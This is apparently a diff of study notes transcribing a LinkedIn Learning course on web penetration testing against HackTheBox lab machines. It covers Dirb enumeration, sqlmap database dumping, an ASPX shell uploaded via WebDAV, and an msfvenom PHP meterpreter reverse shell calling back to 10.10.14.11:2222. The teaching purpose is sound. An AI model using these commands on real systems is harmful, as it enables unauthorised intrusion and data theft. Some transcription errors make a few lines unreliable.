-> **[1:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=83)** DirBuster is set by default to brute force both folders and files, and PHP files, types are selected.
+> **[1:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=83)** DirBuster is set by default to brute force both folders and files, and [[PHP]] files, types are selected.
 >
 > **[1:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=91)** 'Kay, so let's start the scan.
 >
@@ -1151,7 +1138,7 @@ created: 2026-05-02
 >
 > **[2:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=125)** An Advanced Options window pops up with five tabs.
 >
-> **[2:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=129)** We're on the first tab, which is HTML Parsing Options.
+> **[2:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=129)** We're on the first tab, which is [[HTML]] Parsing Options.
 >
 > **[2:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=133)** This shows which elements of the page, DirBuster, will extract links from.
 >
@@ -1171,13 +1158,13 @@ created: 2026-05-02
 >
 > **[2:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=174)** It's not uncommon to find HTTP servers using custom headers including X-Powered-By, X-Cash, X-Pingback, X-Forwarded-For, and X-HTTP-Method-Override.
 >
-> **[3:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=187)** WordPress, for example, uses X-Powered-By and X-Pingback.
+> **[3:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=187)** [[WordPress]], for example, uses X-Powered-By and X-Pingback.
 >
 > **[3:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=192)** Note, we have to have a strinouncing itself as the user agent, a clear giveaway in a red team that the risk reconnaissance is underway.
 >
 > **[3:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=201)** This is one field you may wish to change.
 >
-> **[3:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=205)** We're not running through a proxy right now, but we could stage this through Burp Suite if we wanted to inspect the messages.
+> **[3:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=205)** We're not running through a proxy right now, but we could stage this through [[Burp Suite]] if we wanted to inspect the messages.
 >
 > **[3:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=212)** The next tab is Scan Options.
 >
@@ -1189,7 +1176,7 @@ created: 2026-05-02
 >
 > **[3:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=239)** Okay, let's leave DirBuster for now.
 >
-> **[4:02](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=242)** DIRB is another dictionary-based enumeration tool which is simple to use and runs relatively quickly using a built-in set of common folders and file names.
+> **[4:02](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=242)** [[Dirb]] is another dictionary-based enumeration tool which is simple to use and runs relatively quickly using a built-in set of common folders and file names.
 >
 > **[4:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=253)** DIRB runs from the command line and in its simplest form, takes the URL as an argument.
 >
@@ -1201,7 +1188,7 @@ created: 2026-05-02
 >
 > **[4:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=286)** DIRB also provides some options.
 >
-> **[4:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=288)** We can specify our own word list and we can indicate extensions to try such as HTML or PHP.
+> **[4:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=288)** We can specify our own [[Microsoft Word|word]] list and we can indicate extensions to try such as HTML or PHP.
 >
 > **[4:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=298)** The final Carly tool we'll look at for finding web pages is Wfuzz.
 >
@@ -1229,7 +1216,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Microsoft Word|Word]] (3), web (2), [[PHP]] (2), [[HTML]] (2), next (2)
+> **Frameworks & Libraries:** [[Dirb]] (6), [[Microsoft Word|Word]] (3), [[PHP]] (2), [[HTML]] (2), [[Gobuster]] (1)
 > **Env Vars:** url (3), http (3), dirb (3), php (2), html (2)
 > **Versions:** 192.168.60 (8), 48.1898 (2), 2.3 (2)
 > **URLs:** [http://192.168.60.48:1898](http://192.168.60.48:1898) (6), [http://192.168.60.48.1898](http://192.168.60.48.1898) (2)
@@ -1243,12 +1230,11 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Vulnerability scanning with Burp Suite
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980)
+#### [Vulnerability scanning with Burp Suite](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=0)** - [Instructor] The tool most professional pen testers use for web testing is Burp Suite, and we'll be using it for our advanced testing.
+> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=0)** - [Instructor] The tool most professional pen testers use for web testing is [[Burp Suite]], and we'll be using it for our advanced testing.
 >
 > **[0:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=8)** Carly includes the free community version, but this doesn't support vulnerability scanning, the professional edition does, and we'll use that to learn how to crawl a website to look for vulnerabilities.
 >
@@ -1256,7 +1242,7 @@ created: 2026-05-02
 >
 > **[0:27](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=27)** Web application scanning is one of the most important defensive measures we can take to protect our websites, but it takes time, and a typical scan will produce a large number of issues.
 >
-> **[0:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=39)** These need to be filtered out to those which are an exploitation risk, and this requires that we combine a scan with targeted penetration testing, to demonstrate which of the scan findings are exploitable issues.
+> **[0:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=39)** These need to be filtered out to those which are an exploitation risk, and this requires that we combine a scan with targeted [[Penetration Testing]], to demonstrate which of the scan findings are exploitable issues.
 >
 > **[0:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=53)** Let's check the hack the box popcorn web application for vulnerabilities.
 >
@@ -1302,21 +1288,20 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Burp Suite]] (5), web (2), web application (2), [[Penetration Testing]] (1), application (1)
+> **Frameworks & Libraries:** [[Burp Suite]] (5), [[Penetration Testing]] (1)
 > **Env Vars:** http (2), https (1)
 > **CLI Commands:** find (2)
 > **UI Navigation:** go to (1), click on (1)
 > **Versions:** 10.10.10 (1)
 > **Speakers:** - [instructor] (1)
 
-#### Using sqlmap to validate SQL injections
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980)
+#### [Using sqlmap to validate SQL injections](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=0)** - Let's take a look at how we approach validation of a web server issue using sqlmap.
+> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=0)** - Let's take a look at how we approach validation of a web server issue using [[SQLmap]].
 >
-> **[0:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=6)** We've done our web app testing on the hackthebox popcorn server and we've found a torrent page which is injectable.
+> **[0:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=6)** We've done our web app testing on the [[HackTheBox]] popcorn server and we've found a torrent page which is injectable.
 >
 > **[0:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=13)** In order to demonstrate the vulnerability, we'll start by going to "proxy", make sure Intercept is off, and open the browser.
 >
@@ -1324,15 +1309,15 @@ created: 2026-05-02
 >
 > **[0:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=33)** And we'll enter "admin", "admin", and that doesn't work.
 >
-> **[0:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=43)** But we want to validate that it is an SQL injection vulnerability.
+> **[0:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=43)** But we want to validate that it is an [[SQL]] injection vulnerability.
 >
-> **[0:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=48)** So let's now go back to Burp Suite and to "HTTP history" and look for the "POST" message.
+> **[0:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=48)** So let's now go back to [[Burp Suite]] and to "HTTP history" and look for the "POST" message.
 >
 > **[0:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=58)** We'll select this and in the Request details at the bottom, select "Copy to file" and we'll call that "popreq" and save it.
 >
 > **[1:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=70)** In the Kali terminal, we can use this to run an sqlmap test: "sqlmap -r popreq" As we start running, we'll be asked a few questions and we can take the defaults.
 >
-> **[1:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=89)** That's done, and we found an injection point, so we can now repeat the sqlmap request, adding the dbs switch to use the injections sqlmap found to list all databases.
+> **[1:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=89)** That's done, and we found an injection point, so we can now repeat the sqlmap request, adding the dbs switch to use the injections sqlmap found to list all [[Databases]].
 >
 > **[1:45](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=105)** Let's select the "torrenthoster" database and run sqlmap again to find its tables.
 >
@@ -1352,7 +1337,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** web (2), [[SQL]] (2), [[Databases]] (2), [[Burp Suite]] (1), database (1)
+> **Frameworks & Libraries:** [[SQLmap]] (8), [[SQL]] (2), [[Databases]] (2), [[HackTheBox]] (1), [[Burp Suite]] (1)
 > **Env Vars:** sql (2), http (1), post (1)
 > **UI Navigation:** select the (2), open the (1), switch to (1)
 > **CLI Commands:** make (1), find (1)
@@ -1366,8 +1351,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Exploiting your way into the gym
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980)
+#### [Exploiting your way into the gym](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1377,11 +1361,11 @@ created: 2026-05-02
 >
 > **[0:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=11)** I've downloaded and unzipped this application.
 >
-> **[0:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=15)** We can see this is a PHP website, and if we have a look in the database folder, we can see the setup script for it.
+> **[0:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=15)** We can see this is a [[PHP]] website, and if we have a look in the database folder, we can see the setup script for it.
 >
 > **[0:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=26)** The installation instructions require us to set up the application by importing this setup script.
 >
-> **[0:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=32)** In addition, we need to modify the DB connect .pi script and update it with our privileged SQL user credentials.
+> **[0:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=32)** In addition, we need to modify the DB connect .pi script and update it with our privileged [[SQL]] user credentials.
 >
 > **[0:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=40)** I've done this already, so let's go take a look at it.
 >
@@ -1403,7 +1387,7 @@ created: 2026-05-02
 >
 > **[1:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=82)** There's a slightly more advanced version of the gym management system that we can find at this site and this particular variant has an upload function which we can exploit.
 >
-> **[1:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=93)** We can search for exploits of gym systems using search 'sploit space Gym, and we find there's a Python script for an unauthenticated remote code execution which is for this system.
+> **[1:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=93)** We can search for exploits of gym systems using search 'sploit space Gym, and we find there's a [[Python (Programming Language)|Python]] script for an unauthenticated remote code execution which is for this system.
 >
 > **[1:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=109)** So let's copy Slash user slash share slash exploit db slash exploits slash php web apps 4 8 5 0 6 dot py
 >
@@ -1447,7 +1431,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[PHP]] (6), management (4), [[Python (Programming Language)|Python]] (4), application (2), [[SQL]] (2)
+> **Frameworks & Libraries:** [[PHP]] (6), [[Python (Programming Language)|Python]] (4), [[SQL]] (2)
 > **CLI Commands:** php (6), python (4), find (2), make (2)
 > **Speakers:** - let (1), - or (1), - one (1), - hash (1), - and (1)
 > **Env Vars:** php (2), sql (2), png (2)
@@ -1456,8 +1440,7 @@ created: 2026-05-02
 > **Tools:** command prompt (1)
 > **Exercise Files:** source code (1)
 
-#### Exploiting through an ASPX shell with Cadaver
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980)
+#### [Exploiting through an ASPX shell with Cadaver](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1491,9 +1474,9 @@ created: 2026-05-02
 >
 > **[1:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=84)** Let's check the basics out with whatweb 10, dot 10, dot 10, dot 15.
 >
-> **[1:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=93)** And we see this is powered by [ASP.NET](https://ASP.NET), so we know the kind of shell will want loaded.
+> **[1:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=93)** And we see this is powered by [[[ASP.NET]]](https://ASP.NET), so we know the kind of shell will want loaded.
 >
-> **[1:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=99)** We can run Nikto to get a bit more information.
+> **[1:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=99)** We can run [[Nikto]] to get a bit more information.
 >
 > **[1:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=104)** Nikto minus H 10, dot 10, dot 10, dot 15.
 >
@@ -1501,7 +1484,7 @@ created: 2026-05-02
 >
 > **[2:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=121)** That's exactly what we wanted to see.
 >
-> **[2:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=124)** Let's stop this now and we'll use the nmap WebDAV script to see whether WebDAV is supported.
+> **[2:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=124)** Let's stop this now and we'll use the [[Nmap]] WebDAV script to see whether WebDAV is supported.
 >
 > **[2:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=131)** Nmap 10, dot 10, dot 10, dot 15 minus, minus script equals http WebDAV scan.
 >
@@ -1565,7 +1548,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** web (7), prompt (2), [[ASP.NET]] (1), business (1)
+> **Frameworks & Libraries:** [[Nikto]] (3), [[Nmap]] (2), [[ASP.NET]] (1)
 > **Env Vars:** aspx (6), http (4), asp (4), put (2), pen (1)
 > **Definitions:** is an  (2), is a  (2)
 > **Tools:** command line (1), bash (1), command prompt (1)
@@ -1574,8 +1557,7 @@ created: 2026-05-02
 > **Code Identifiers:** cmbasp (1)
 > **URLs:** [asp.net](https://asp.net) (1)
 
-#### Checking web page source
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980)
+#### [Checking web page source](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1591,11 +1573,11 @@ created: 2026-05-02
 >
 > **[0:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=28)** We'll not get any further here.
 >
-> **[0:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=31)** Let's use DIRB to do a quick check for hidden pages, dirb [http://10.10.10.27](http://10.10.10.27).
+> **[0:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=31)** Let's use [[Dirb]] to do a quick check for hidden pages, dirb [http://10.10.10.27](http://10.10.10.27).
 >
 > **[0:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=37)** dirb [http://10.10.10.27](http://10.10.10.27).
 >
-> **[0:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=43)** We found an admin.php file as well as the standard index and service-status files.
+> **[0:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=43)** We found an admin.[[PHP]] file as well as the standard index and service-status files.
 >
 > **[0:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=50)** Let's go take a look at it.
 >
@@ -1617,7 +1599,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** web (1), [[PHP]] (1)
+> **Frameworks & Libraries:** [[Dirb]] (3), [[PHP]] (1)
 > **CLI Commands:** find (2), php (1)
 > **Versions:** 10.10.10 (3)
 > **URLs:** [http://10.10.10.27](http://10.10.10.27) (2)
@@ -1626,8 +1608,7 @@ created: 2026-05-02
 > **Definitions:** is a  (1)
 > **Speakers:** - [instructor] (1)
 
-#### Injecting HTML into a web page
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980)
+#### [Injecting HTML into a web page](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1635,13 +1616,13 @@ created: 2026-05-02
 >
 > **[0:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=4)** Once we logged in, we found what appears to be a webpage, crafted by a somewhat disgruntled employee.
 >
-> **[0:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=12)** On the webpage, we can see an HTML entry box.
+> **[0:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=12)** On the webpage, we can see an [[HTML]] entry box.
 >
 > **[0:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=15)** Let's enter some HTML <B>Z< /B> appa, and we get Zappa.
 >
 > **[0:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=28)** Okay, we're running HTML.
 >
-> **[0:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=31)** It's worth checking now whether that HTML supports, an active scripting language, perhaps PHP.
+> **[0:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=31)** It's worth checking now whether that HTML supports, an active scripting language, perhaps [[PHP]].
 >
 > **[0:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=37)** Let's try a PHP echo command, <?php echo' <p> Lumpy Gravy is good </p> ' ; And show me the page.
 >
@@ -1649,15 +1630,15 @@ created: 2026-05-02
 >
 > **[1:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=65)** Yep. It supports PHP.
 >
-> **[1:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=68)** So let's create a simple, PHP meterpreter reverse shell using MSFvenom.
+> **[1:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=68)** So let's create a simple, PHP meterpreter reverse shell using [[Metasploit|MSFvenom]].
 >
 > **[1:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=74)** Our IP address is 10.10.14.11 and we'll use port 2222.
 >
 > **[1:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=83)** msfvenom -p php /meterpreter /reverse_tcp LHOST= 10.10.14.11 and our LPORT= 2222 Okay, we have the PHP code, so let's copy that.
 >
-> **[1:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=114)** Before we paste and run it, we'll need to set up a meterpreter listener, in Metasploit.
+> **[1:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=114)** Before we paste and run it, we'll need to set up a meterpreter listener, in [[Metasploit]].
 >
-> **[2:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=120)** We'll type msfconsole.
+> **[2:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=120)** We'll type [[Metasploit|msfconsole]].
 >
 > **[2:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=126)** use multi/handler.
 >
@@ -1689,13 +1670,13 @@ created: 2026-05-02
 >
 > **[3:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=230)** Calamity shows us that checking the simple things, can sometimes save a lot of effort.
 >
-> **[3:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=235)** Not all penetration testing requires, complex exploit activity.
+> **[3:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=235)** Not all [[Penetration Testing]] requires, complex exploit activity.
 >
 > **[4:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=240)** We've been able to get into a full user shell and retrieve the token with relatively little effort.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[PHP]] (9), [[HTML]] (4), [[Scripting]] (1), data (1), [[Penetration Testing]] (1)
+> **Frameworks & Libraries:** [[PHP]] (9), [[HTML]] (4), [[Metasploit|Msfvenom]] (2), [[Metasploit]] (1), [[Metasploit|Msfconsole]] (1)
 > **CLI Commands:** php (9), ls (2), cat (1)
 > **Env Vars:** php (6), html (4), lhost (1), lport (1)
 > **Versions:** 10.10.14 (3)
@@ -1704,12 +1685,11 @@ created: 2026-05-02
 > **Ports:** port 2222 (1)
 > **Cross-References:** previous video (1)
 
-#### Exploiting tools left on websites
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980)
+#### [Exploiting tools left on websites](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=0)** - [Instructor] We'll often see PHP being used on websites, and there are many tools that developers use for doing their development.
+> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=0)** - [Instructor] We'll often see [[PHP]] being used on websites, and there are many tools that developers use for doing their development.
 >
 > **[0:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=7)** In some cases, these tools are left active.
 >
@@ -1759,7 +1739,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[PHP]] (4), [[Scripting]] (1), data (1), web (1), [[Troubleshooting]] (1)
+> **Frameworks & Libraries:** [[PHP]] (4)
 > **CLI Commands:** php (4), find (1), ls (1), cat (1)
 > **Env Vars:** dlrb (3), php (1), http (1)
 > **File Paths:** phpbash.php (2)
@@ -1768,16 +1748,15 @@ created: 2026-05-02
 > **Definitions:** is a  (1), is an  (1)
 > **UI Navigation:** click on (1)
 
-#### Injecting SQL using Burp Suite
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980)
